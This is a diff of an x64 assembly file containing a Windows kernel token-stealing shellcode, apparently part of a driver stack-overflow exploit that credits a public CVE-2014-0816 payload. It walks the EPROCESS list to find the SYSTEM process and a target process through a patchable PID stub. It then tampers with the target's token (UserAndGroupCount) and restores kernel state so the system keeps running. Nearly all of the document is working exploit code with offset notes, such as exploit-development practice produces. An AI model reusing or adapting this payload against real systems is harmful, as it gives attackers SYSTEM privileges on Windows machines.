@@ -24,7 +24,8 @@ FLINK_OFFSET     EQU   0B8h  ;// nt!_EPROCESS.ActiveProcessLinks.Flink
 TOKEN_OFFSET     EQU   0F8h  ;// nt!_EPROCESS.Token
 SYSTEM_PID       EQU   004h  ;// SYSTEM Process PID
 
-.data 
+
+.DATA ; --- avoid using .CODE section because we need to patch PID
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;
@@ -75,8 +76,7 @@ ENDM
 ;
 ; implementations
 ;
-.DATA
-;.CODE ; --- avoid using .CODE section because we need to patch PID
+.DATA ; --- avoid using .CODE section because we need to patch PID
 
 ; https://github.com/tandasat/CVE-2014-0816/blob/master/exploit_ngs/exploit_ngs/shellcode.asm
 
@@ -86,55 +86,63 @@ TokenStealingPayloadStackOverflow PROC
 	PUSHAQ	; Save registers state
 
 	
-
 	mov RDX, qword ptr gs:[188h]
-	; dt nt!_KTHREAD @RDX
-	;mov rdx, [gs:188h] ; KTHREAD pointer (// 0x188 = nt!_KPCR.PcrbData.CurrentThread)
-	; RDX = (_KTHREAD*) nt!_KPCR.PcrbData.CurrentThread 
+	; > The GS points to the Kernel Processor Control Region (KPCR)
+	; >  dt nt!_KPCR 	--> ..  +0x180 Prcb             : _KPRCB
+	; >  dt nt!_KPRCB 	--> ..  +0x008 CurrentThread    : Ptr64 _KTHREAD
+	; > RDX = (_KTHREAD*) nt!_KPCR.Pcrb.CurrentThread 
+	; > double check - dt nt!_KTHREAD @RDX
 
 	mov r8, [RDX + 0B8h] ; EPROCESS pointer (nt!_KTHREAD.ApcState.Process)
-	; dt nt!_EPROCESS @R8
-	; R8 = (_KPROCESS*) nt!_KTHREAD.ApcState.Process
+	; >  dt nt!_KTHREAD 	-->> ..   +0x098 ApcState         : _KAPC_STATE
+	; >  dt nt!_KAPC_STATE	-->> ..   +0x020 Process          : Ptr64 _KPROCESS (or) _EPROCESS
+	; > R8 = (_KPROCESS*) nt!_KTHREAD.ApcState.Process
+	; > double check - dt nt!_EPROCESS @R8
 
-	mov r9, [r8 + 2E8h] ; ActiveProcessLinks list head
-	; dt nt!_LIST_ENTRY @R9
-	; R9 = (_LIST_ENTRY) nt!_EPROCESS.ActiveProcessLinks 
+	mov r9, [r8 + 2F0h] ; ActiveProcessLinks list head
+	; > dt nt!_EPROCESS		-->> ..   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
+	; > R9 = (_LIST_ENTRY) nt!_EPROCESS.ActiveProcessLinks 
+	; > double check - dt nt!_LIST_ENTRY @R9
 
 	mov RCX, [r9] ; follow link to first process in list
-	; dt nt!_LIST_ENTRY @RCX
-	;RCX = ActiveProcessLinks.Flink
+	; > RCX = ActiveProcessLinks.Flink
+	; > double check - dt nt!_LIST_ENTRY @RCX
 
 	find_system:
 		mov RDX, [RCX-8] ; ActiveProcessLinks - 8 = UniqueProcessId
-		cmp RDX, 4 ;UniqueProcessId == 4?
+		cmp RDX, 4 ; UniqueProcessId == 4 (SYSTEM:4)?
 		jz found_system ;YES - move on
-		mov RCX, [RCX] ;NO - load next entry in list
+		mov RCX, [RCX] ; NO - load next entry in list
 		jmp find_system ; loop
 	
 	found_system:
 		; RCX = nt!_EPROCESS.ActiveProcessLinks (offset = +0x2f0)
-		; nt!_EPROCESS.token (offset = +0x358)
-		; 0x358 - 0x2e8  = 0x70
+		; > dt nt!_EPROCESS 	-->> ..    +0x358 Token            : _EX_FAST_REF
+		; 0x358 - 0x2f0  = 0x68
 		; RCX + 68h = nt!_EPROCESS.token
-		mov RAX, [RCX + 70h] ;offset to token (+0x358)
-		; RAX = content of nt!_EX_FAST_REF
-
-		and al, 0f0h ;clear low 4 bits of _EX_FAST_REF structure
+		; > double check - dt nt!_EX_FAST_REF [@RCX+0x68]
+		mov RAX, [RCX + 358h - 2f0h] ;offset to token (+0x358)
+		
+		and al, 0f0h ; clear _EX_FAST_REF.RefCnt, which locates low 4 bits of the structure
 
 	find_cmd:
 		mov RDX, [RCX-8] ;ActiveProcessLinks - 8 = UniqueProcessId
 		
-		cmp RDX, 0DDAABBEEh ; universal
+		cmp RDX, 0DDAABBEEh ; universal PID-stub
 
-		;cmp RDX, 1644h; cmd.exe dec 5700 for testing via VMWare with Snapshot
+		;cmp RDX, 12F8h; cmd.exe dec 5700 for testing via VMWare with Snapshot
 		
-
-		jz found_cmd ;YES - move on
+		jz found_cmd ; YES - move on
 		mov RCX, [RCX] ;NO - next entry in list
 		jmp find_cmd ;loop
 	
 	found_cmd:
-		mov [RCX + 70h], rax ;copy SYSTEM token over top of this process's token
+		; mov [RCX + 358h - 2f0h], rax ;copy SYSTEM token over top of this process's token
+		
+		mov AX, word ptr [rax + 07Ch]        ;  < go to system UserAndGroupCount -field,  RAX=UserAndGroupCount;
+		mov RDX, [RCX + 358h - 2f0h] ; < go to target TOKEN structure
+		and dl, 0f0h                 ; clear _EX_FAST_REF.RefCnt, which locates low 4 bits of the structure
+		mov word ptr [RDX + 07Ch], AX        ; < overwrite target UserAndGroupCount using system UserAndGroupCount
 	
 	return:  ; Kernel Recovery Stub
 	
@@ -147,10 +155,11 @@ TokenStealingPayloadStackOverflow PROC
 	mov RSI, 0
 
 	mov dword ptr [RSP+38h+30h+8h], 0 ; We set status = 0, because pIrp->IoStatus.Status = status;
-	; mov     eax,dword ptr [rsp+30h] (+8) because of return address
+	; > mov     eax,dword ptr [rsp+30h] (+8) because of return address
+	
 	mov dword ptr [RSP+38h+34h+8h], 0
-	;  mov     ecx,dword ptr [rsp+34h]  (+8) because of return address
-	; pIrp->IoStatus.Information = info;
+	; > mov     ecx,dword ptr [rsp+34h]  (+8) because of return address
+	; > pIrp->IoStatus.Information = info;
 	
 
 	add     rsp, 38h ; Restore stack state
